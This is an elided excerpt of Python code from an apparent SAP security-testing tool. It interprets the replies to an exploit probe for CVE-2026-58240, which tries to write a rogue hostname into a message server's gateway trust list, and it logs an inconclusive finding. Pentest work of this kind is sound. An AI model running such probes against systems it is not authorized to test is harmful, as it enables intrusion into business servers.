...
def create_app(api: SAPMAPApi) -> Bottle:
    ...
    def node_exploit_cve_2026_58240_register(sid):
        ...
        def _run():
            ...
            #   broadcast_seen=False    → INCONCLUSIVE.  We CANNOT
            #                             claim "patched" just from the
            #                             absence of a broadcast — an
            #                             unpatched server that rejects
            #                             our payload as malformed will
            #                             also not broadcast.  A truly
            #                             patched server rejects with a
            #                             specific opcode-error pattern
            #                             (see below).
            #   reply_len==0 AND err!=""→ NETWORK ERROR
            #
            # Print every reply the server sent so the operator can
            # eyeball the pattern.  A vulnerable-but-malformed-payload
            # case looks different from a patched case; we don't yet
            # have enough live data to tell them apart algorithmically.
            reply_len = r.get("reply_len", 0)
            broadcast = r.get("broadcast_seen", False)
            replies   = r.get("replies", [])
            for i, rep in enumerate(replies, 1):
                print(f"[*] {sid}:   reply {i}/{len(replies)}: "
                      f"{rep['len']} B, opcode=0x{rep['opcode']:02x} "
                      f"err={rep['opc_err']} hdr_errorno="
                      f"{rep['errorno']} from={rep['fromname']!r}")
                print(f"[*] {sid}:     head: {rep['head_hex']}")
                if rep.get("tail_hex"):
                    print(f"[*] {sid}:     tail: {rep['tail_hex']}")
            if broadcast:
                ...
                # Server responded but no broadcast.  This does NOT
                # by itself prove the target is patched — the more
                # common cause on live 9.x targets (verified against
                # kernel 9.16 PL75) is that our LOGON payload byte
                # layout is not accepted and the server rejects it
                # before reaching the trust-list-write code path.
                # A truly patched server would run the payload
                # validator successfully and only THEN fail the new
                # source-host check.  Distinguishing the two needs
                # further wire-level analysis against a known-
                # unpatched target — until then we surface the
                # replies but stay agnostic.
                node.cve_2026_58240_evidence = "no_broadcast"
                print(f"[?] {sid}: NO BROADCAST — server replied "
                      f"{reply_len} B across {len(replies)} frame(s) "
                      f"but did not push MsSSndAscsGwInfo with our "
                      f"rogue hostname.  This is INCONCLUSIVE: "
                      f"either the kernel is patched (write path "
                      f"blocked) OR the LOGON payload layout we sent "
                      f"was rejected as malformed.  Compare the "
                      f"opcode-err bytes in the reply dump above "
                      f"against a known-unpatched reference to "
                      f"tell them apart.")
                sapmap_findings.emit_finding(
                    "MEDIUM", sid,
                    f"CVE-2026-58240 write-path probe returned no "
                    f"broadcast — {node.ip}:{ms_port} replied "
                    f"{reply_len} B but did NOT emit "
                    f"MsSSndAscsGwInfo.  Interpretation is "
                    f"inconclusive without a reference reply: the "
                    f"target may be patched, OR our LOGON payload "
                    f"layout may be malformed and rejected before "
                    f"the vulnerable code path is reached.",
                    cve="CVE-2026-58240",
                    ref="ms.ascs_gw.no_broadcast",
                    attack_capability="exploit.ms_ascs_gw_rogue")
            else:
